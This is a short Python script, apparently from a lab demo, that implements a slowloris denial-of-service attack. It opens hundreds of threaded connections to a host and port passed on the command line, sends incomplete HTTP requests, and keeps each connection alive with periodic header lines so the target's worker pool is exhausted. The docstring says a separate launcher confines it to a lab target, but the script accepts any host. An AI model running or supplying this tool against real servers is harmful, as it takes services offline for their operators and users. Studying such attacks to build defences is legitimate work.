#!/usr/bin/env python3
"""Minimal hold-open slowloris used by the demo launcher. Opens many connections
to the target app, sends a partial HTTP request on each, and keeps them open by
dribbling a header line every few seconds. Held connections occupy the app's
workers, which is what takes a small worker-pool server down.

Locked to the lab target by the launcher (it passes host/port). Time-boxed by the
launcher too (it kills this process)."""
import argparse
import socket
import threading
import time


def hold_one(host, port, lifetime):
    try:
        s = socket.create_connection((host, port), timeout=4)
        s.settimeout(4)
        s.send(b"GET /?x HTTP/1.1\r\n")
        s.send(b"Host: %s\r\n" % host.encode())
        end = time.time() + lifetime
        while time.time() < end:
            try:
                s.send(b"X-a: keep\r\n")   # never send the final blank line
            except Exception:
                return
            time.sleep(3)
        s.close()
    except Exception:
        return


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--connections", type=int, default=300)
    p.add_argument("--seconds", type=int, default=30)
    args = p.parse_args()

    threads = []
    # open connections in a quick ramp so the pool fills within a couple seconds
    for _ in range(args.connections):
        t = threading.Thread(target=hold_one,
                             args=(args.host, args.port, args.seconds),
                             daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.005)
    time.sleep(args.seconds)


if __name__ == "__main__":
    main()
